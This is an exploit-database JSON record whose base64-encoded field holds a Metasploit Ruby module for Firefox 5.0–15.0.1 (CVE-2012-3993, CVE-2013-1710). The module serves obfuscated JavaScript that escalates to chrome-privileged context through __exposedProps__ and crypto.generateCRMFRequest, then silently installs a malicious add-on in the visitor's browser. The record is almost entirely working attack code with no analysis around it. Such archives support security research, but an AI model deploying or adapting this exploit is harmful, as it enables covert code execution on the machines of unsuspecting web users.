{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckV4cGxvaXRTZXJ2ZXINCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6QnJvd3NlckF1dG9wd24NCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6RmlyZWZveEFkZG9uR2VuZXJhdG9yDQoNCiAgYXV0b3B3bl9pbmZvKHsNCiAgICA6dWFfbmFtZSAgICA9PiBIdHRwQ2xpZW50czo6RkYsDQogICAgOnVhX21pbnZlciAgPT4gIjUuMCIsDQogICAgOnVhX21heHZlciAgPT4gIjE1LjAuMSIsDQogICAgOmphdmFzY3JpcHQgPT4gdHJ1ZSwNCiAgICA6cmFuayAgICAgICA9PiBOb3JtYWxSYW5raW5nDQogIH0pDQoNCiAgZGVmIGluaXRpYWxpemUoaW5mbyA9IHt9KQ0KICAgIHN1cGVyKHVwZGF0ZV9pbmZvKGluZm8sDQogICAgICAnTmFtZScgICAgICAgICAgID0+ICdGaXJlZm94IDUuMCAtIDE1LjAuMSBfX2V4cG9zZWRQcm9wc19fIFhDUyBDb2RlIEV4ZWN1dGlvbicsDQogICAgICAnRGVzY3JpcHRpb24nICAgID0+ICVxew0KICAgICAgICBPbiB2ZXJzaW9ucyBvZiBGaXJlZm94IGZyb20gNS4wIHRvIDE1LjAuMSwgdGhlIEluc3RhbGxUcmlnZ2VyIGdsb2JhbCwgd2hlbiBnaXZlbg0KICAgICAgICBpbnZhbGlkIGlucHV0LCB3b3VsZCB0aHJvdyBhbiBleGNlcHRpb24gdGhhdCBkaWQgbm90IGhhdmUgYW4gX19leHBvc2VkUHJvcHNfXw0KICAgICAgICBwcm9wZXJ0eSBzZXQuIEJ5IHJlLXNldHRpbmcgdGhpcyBwcm9wZXJ0eSBvbiB0aGUgZXhjZXB0aW9uIG9iamVjdCdzIHByb3RvdHlwZSwNCiAgICAgICAgdGhlIGNocm9tZS1iYXNlZCBkZWZpbmVQcm9wZXJ0eSBtZXRob2QgaXMgbWFkZSBhdmFpbGFibGUuDQogICAgICAgIFdpdGggdGhlIGRlZmluZVByb3BlcnR5IG1ldGhvZCwgZnVuY3Rpb25zIGJlbG9uZ2luZyB0byB3aW5kb3cgYW5kIGRvY3VtZW50IGNhbiBiZQ0KICAgICAgICBvdmVycmlkZW4gd2l0aCBhIGZ1bmN0aW9uIHRoYXQgZ2V0cyBjYWxsZWQgZnJvbSBjaHJvbWUtcHJpdmlsZWdlZCBjb250ZXh0LiBGcm9tIGhlcmUsDQogICAgICAgIGFub3RoZXIgdnVsbmVyYWJpbGl0eSBpbiB0aGUgY3J5cHRvLmdlbmVyYXRlQ1JNRlJlcXVlc3QgZnVuY3Rpb24gaXMgdXNlZCB0byAicGVlayINCiAgICAgICAgaW50byB0aGUgY29udGV4dCdzIHByaXZhdGUgc2NvcGUuIFNpbmNlIHRoZSB3aW5kb3cgZG9lcyBub3QgaGF2ZSBhIGNocm9tZTovLyBVUkwsDQogICAgICAgIHRoZSBpbnNlY3VyZSBwYXJ0cyBvZiBDb21wb25lbnRzLmNsYXNzZXMgYXJlIG5vdCBhdmFpbGFibGUsIHNvIGluc3RlYWQgdGhlIEFkZG9uTWFuYWdlcg0KICAgICAgICBBUEkgaXMgaW52b2tlZCB0byBzaWxlbnRseSBpbnN0YWxsIGEgbWFsaWNpb3VzIHBsdWdpbi4NCiAgICAgIH0sDQogICAgICAnTGljZW5zZScgPT4gTVNGX0xJQ0VOU0UsDQogICAgICAnQXV0aG9yJyAgPT4gWw0KICAgICAgICAnTWFyaXVzeiBNbHluc2tpJywgIyBkaXNjb3ZlcmVkIENWRS0yMDEyLTM5OTMNCiAgICAgICAgJ21vel9idWdfcl9hNCcsICMgZGlzY292ZXJlZCBDVkUtMjAxMy0xNzEwDQogICAgICAgICdqb2V2JyAjIG1ldGFzcGxvaXQgbW9kdWxlDQogICAgICBdLA0KICAgICAgJ0Rpc2Nsb3N1cmVEYXRlJyA9PiAiQXVnIDYgMjAxMyIsDQogICAgICAnUmVmZXJlbmNlcycgPT4gWw0KICAgICAgICBbJ0NWRScsICcyMDEyLTM5OTMnXSwgICMgdXNlZCB0byBpbnN0YWxsIGZ1bmN0aW9uIHRoYXQgZ2V0cyBjYWxsZWQgZnJvbSBjaHJvbWU6Ly8gKGZmPDE1KQ0KICAgICAgICBbJ1VSTCcsICdodHRwczovL2J1Z3ppbGxhLm1vemlsbGEub3JnL3Nob3dfYnVnLmNnaT9pZD03NjgxMDEnXSwNCiAgICAgICAgWydDVkUnLCAnMjAxMy0xNzEwJ10sICAjIHVzZWQgdG8gcGVlayBpbnRvIHByaXZpbGVnZWQgY2FsbGVyJ3MgY2xvc3VyZSAoZmY8MjMpDQogICAgICBdLA0KICAgICAgJ0Jyb3dzZXJSZXF1aXJlbWVudHMnID0+IHsNCiAgICAgICAgOnNvdXJjZSAgPT4gJ3NjcmlwdCcsDQogICAgICAgIDp1YV9uYW1lID0+IEh0dHBDbGllbnRzOjpGRiwNCiAgICAgICAgOnVhX3ZlciAgPT4gbGFtYmRhIHsgfHZlcnwgdmVyLnRvX2kuYmV0d2Vlbj8oNSwgMTUpIH0NCiAgICAgIH0NCiAgICApKQ0KDQogICAgcmVnaXN0ZXJfb3B0aW9ucyhbDQogICAgICBPcHRTdHJpbmcubmV3KCdDT05URU5UJywgWyBmYWxzZSwgIkNvbnRlbnQgdG8gZGlzcGxheSBpbnNpZGUgdGhlIEhUTUwgPGJvZHk+LiIsICcnIF0gKQ0KICAgIF0sIHNlbGYuY2xhc3MpDQogIGVuZA0KDQogIGRlZiBvbl9yZXF1ZXN0X2V4cGxvaXQoY2xpLCByZXF1ZXN0LCB0YXJnZXRfaW5mbykNCiAgICBpZiByZXF1ZXN0LnVyaS5tYXRjaCgvXC54cGkkL2kpDQogICAgICBwcmludF9zdGF0dXMoIlNlbmRpbmcgdGhlIG1hbGljaW91cyBhZGRvbiIpDQogICAgICBzZW5kX3Jlc3BvbnNlKGNsaSwgZ2VuZXJhdGVfYWRkb25feHBpKGNsaSkucGFjaywgeyAnQ29udGVudC1UeXBlJyA9PiAnYXBwbGljYXRpb24veC14cGluc3RhbGwnIH0pDQogICAgZWxzZQ0KICAgICAgcHJpbnRfc3RhdHVzKCJTZW5kaW5nIEhUTUwiKQ0KICAgICAgcmVzID0gZ2VuZXJhdGVfaHRtbCh0YXJnZXRfaW5mbyxyZXF1ZXN0LmhlYWRlcnNbJ0hvc3QnXSkNCiAgICAgIHZwcmludF9zdGF0dXMgcmVzLnRvX3MNCiAgICAgIHNlbmRfcmVzcG9uc2VfaHRtbChjbGksIHJlcykNCiAgICBlbmQNCiAgZW5kDQoNCiAgZGVmIGdlbmVyYXRlX2h0bWwodGFyZ2V0X2luZm8scmVmZXIpDQogICAgaW5qZWN0aW9uID0gaWYgdGFyZ2V0X2luZm9bOnVhX3Zlcl0udG9faSA9PSAxNQ0KICAgICAgIkZ1bmN0aW9uLnByb3RvdHlwZS5jYWxsLmNhbGwocC5fX2RlZmluZUdldHRlcl9fLG9iaixrZXkscnVubWUpOyINCiAgICBlbHNlDQogICAgICAicDIuY29uc3RydWN0b3IuZGVmaW5lUHJvcGVydHkob2JqLGtleSx7Z2V0OnJ1bm1lfSk7Ig0KICAgIGVuZA0KDQogICAgaWYgcmVmZXIubmlsPyBvciByZWZlci5ibGFuaz8NCiAgICAgIHJlZGlyZWN0ID0gIiN7Z2V0X21vZHVsZV91cml9L2FkZG9uLnhwaSINCiAgICBlbHNlDQogICAgICBwcm90byA9ICgoZGF0YXN0b3JlWydTU0wnXSkgPyAnaHR0cHMnIDogJ2h0dHAnKQ0KICAgICAgcmVkaXJlY3QgPSAiI3twcm90b306Ly8je3JlZmVyfSN7Z2V0X21vZHVsZV9yZXNvdXJjZX1hZGRvbi54cGkiDQogICAgZW5kDQoNCiAgICBzY3JpcHQgPSBqc19vYmZ1c2NhdGUgJVF8DQogICAgICB0cnl7SW5zdGFsbFRyaWdnZXIuaW5zdGFsbCgwKX1jYXRjaChlKXtwPWU7fTsNCiAgICAgIHZhciBwMj1PYmplY3QuZ2V0UHJvdG90eXBlT2YoT2JqZWN0LmdldFByb3RvdHlwZU9mKHApKTsNCiAgICAgIHAyLl9fZXhwb3NlZFByb3BzX189ew0KICAgICAgICBjb25zdHJ1Y3RvcjoncncnLA0KICAgICAgICBwcm90b3R5cGU6J3J3JywNCiAgICAgICAgZGVmaW5lUHJvcGVydHk6J3J3JywNCiAgICAgICAgX19leHBvc2VkUHJvcHNfXzoncncnDQogICAgICB9Ow0KICAgICAgdmFyIHMgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCcjcGF5bG9hZCcpLmlubmVySFRNTDsNCiAgICAgIHZhciBxID0gZmFsc2U7DQogICAgICB2YXIgcmVnaXN0ZXIgPSBmdW5jdGlvbihvYmosa2V5KSB7DQogICAgICAgIHZhciBydW5tZSA9IGZ1bmN0aW9uKCl7DQogICAgICAgICAgaWYgKHEpIHJldHVybjsNCiAgICAgICAgICBxID0gdHJ1ZTsNCiAgICAgICAgICB3aW5kb3cuY3J5cHRvLmdlbmVyYXRlQ1JNRlJlcXVlc3QoIkNOPU1lIiwgImZvbyIsICJiYXIiLCBudWxsLCBzLCAzODQsIG51bGwsICJyc2EtZXgiKTsNCiAgICAgICAgfTsNCiAgICAgICAgdHJ5IHsNCiAgICAgICAgICAje2luamVjdGlvbn0NCiAgICAgICAgfSBjYXRjaCAoZSkge30NCiAgICAgIH07DQogICAgICBmb3IgKHZhciBpIGluIHdpbmRvdykgcmVnaXN0ZXIod2luZG93LCBpKTsNCiAgICAgIGZvciAodmFyIGkgaW4gZG9jdW1lbnQpIHJlZ2lzdGVyKGRvY3VtZW50LCBpKTsNCiAgICB8DQoNCiAgICBqc19wYXlsb2FkID0ganNfb2JmdXNjYXRlICVRfA0KICAgICAgaWYgKCF3aW5kb3cuZG9uZSkgew0KICAgICAgICB3aW5kb3cuQWRkb25NYW5hZ2VyLmdldEluc3RhbGxGb3JVUkwoDQogICAgICAgICAgJyN7cmVkaXJlY3R9JywNCiAgICAgICAgICBmdW5jdGlvbihpbnN0YWxsKSB7IGluc3RhbGwuaW5zdGFsbCgpIH0sDQogICAgICAgICAgJ2FwcGxpY2F0aW9uL3gteHBpbnN0YWxsJw0KICAgICAgICApOw0KICAgICAgICB3aW5kb3cuZG9uZSA9IHRydWU7DQogICAgICB9DQogICAgfA0KDQogICAgJVF8DQogICAgICA8aHRtbD4NCiAgICAgIDxib2R5Pg0KICAgICAgI3tkYXRhc3RvcmVbJ0NPTlRFTlQnXX0NCiAgICAgIDxkaXYgaWQ9J3BheWxvYWQnIHN0eWxlPSdkaXNwbGF5Om5vbmUnPg0KICAgICAgICAje2pzX3BheWxvYWR9DQogICAgICA8L2Rpdj4NCiAgICAgIDxzY3JpcHQ+DQogICAgICAgICN7c2NyaXB0fQ0KICAgICAgPC9zY3JpcHQ+DQogICAgICA8L2JvZHk+DQogICAgICA8L2h0bWw+DQogICAgfA0KICBlbmQNCmVuZA==", 
    "filename": "platforms/multiple/local/30474.rb", 
    "id": "30474", 
    "cves": [
        "CVE-2013-1710", 
        "CVE-2012-3993"
    ]
}